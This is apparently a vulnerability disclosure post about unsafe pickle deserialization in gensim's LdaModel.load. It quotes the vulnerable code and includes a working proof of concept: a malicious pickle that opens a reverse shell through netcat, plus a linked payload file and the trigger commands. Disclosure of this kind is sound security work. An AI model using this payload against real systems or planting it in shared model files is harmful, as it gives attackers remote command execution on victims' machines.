---
layout: post
title:  "Command injection via unsafe pickle.loads in LdaModel.load in gensim(Informative)"
date:  2024-06-24 10:31:06 +0800
categories: command-injection
---

## Name

> Command injection via unsafe pickle.loads in LdaModel.load

## Weakness

> CWE-94: Code Injection

## Severity

> High (8.8)

## Version

> 4.3.2

## Description

The gensim api [`gensim.models.ldamodel.LdaModel.load`](https://radimrehurek.com/gensim/models/ldamodel.html#gensim.models.ldamodel.LdaModel.load) is used to Load a LdaModel from file, and the LdaModel is stored in pickle file. In [`LdaModel.load#L1692`](https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/models/ldamodel.py#L1692), it uses `utils.unpickle` to deserilize the model file. And in [`utils.unpickle`](https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/utils.py#L1460), it uses `pickle.load` to load the pickle model which will causing code injection when loading a malicious pickle file.

The vulnerable function: [`LdaModel.load#L1692`](https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/models/ldamodel.py#L1692)

```
@classmethod
    def load(cls, fname, *args, **kwargs):
    ...
    id2word_fname = utils.smart_extension(fname, '.id2word')
    ...
    if os.path.isfile(id2word_fname):
        try:
            # vulnerable to code injection !!!
            result.id2word = utils.unpickle(id2word_fname)
        except Exception as e:
            logging.warning("failed to load id2word dictionary from %s: %s", id2word_fname, e)
    return result
```

The [`utils.unpickle#L1460`](https://github.com/piskvorky/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/utils.py#L1460) funtion:

```
def unpickle(fname):
    """Load object from `fname`, using smart_open so that `fname` can be on S3, HDFS, compressed etc.

    Parameters
    ----------
    fname : str
        Path to pickle file.

    Returns
    -------
    object
        Python object loaded from `fname`.

    """
    with open(fname, 'rb') as f:
        # vulnerable to code injection !!!
        return _pickle.load(f, encoding='latin1')  # needed because loading from S3 doesn't support readline()
```

## Proof of Concept

Firstly, create a malicious pickle file. Use following snippets to create a malicous `payload.pickle` file:

```
import pickle
import os

class RCE:
    def __reduce__(self):
        cmd = ('rm /tmp/f; mkfifo /tmp/f; cat /tmp/f | '
               '/bin/sh -i 2>&1 | nc 127.0.0.1 1234 > /tmp/f')
        return os.system, (cmd,)

with open('payload.pickle', 'wb') as f:
    pickle.dump(RCE(), f)
```

I have uploaded the [`payload.pickle`](https://raw.githubusercontent.com/sunriseXu/onnx/main/payload.pickle) to github for testing.


## Start attack

Install latest gensim:

```
pip install gensim
```

Use following snippets to trigger the unsafe `pickle.loads` command injection:

```
from gensim.models.ldamodel import LdaModel
lda = LdaModel.load("payload.pickle")
```

After the command executed, we can check the `/tmp/f` file is created.

```
> ls -la /tmp/f
prw-r--r-- 1 kali kali 0 Jun 24 19:48 /tmp/f
```
## Colab

Tested on google colab: [https://colab.research.google.com/drive/1XJkrl4-PEjd9lMl_Q-epTyBBORNbJjSj?usp=sharing](https://colab.research.google.com/drive/1XJkrl4-PEjd9lMl_Q-epTyBBORNbJjSj?usp=sharing)

![image](http://live.staticflickr.com/65535/53821790176_089365c3f3_k.jpg)

## Impact

This vulnerability can have severe consequences. If victims load a malicious pickle model using `LdaModel.load`, command injection can be achieved on victims' mechine.


## Occurrences

[LdaModel.load#L1692](https://github.com/RaRe-Technologies/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/models/ldamodel.py#L1692)

[utils.unpickle#L1460](https://github.com/RaRe-Technologies/gensim/blob/dc5b5c48e7454fe22cf98ddac60ff85107226f6a/gensim/utils.py#L1460)

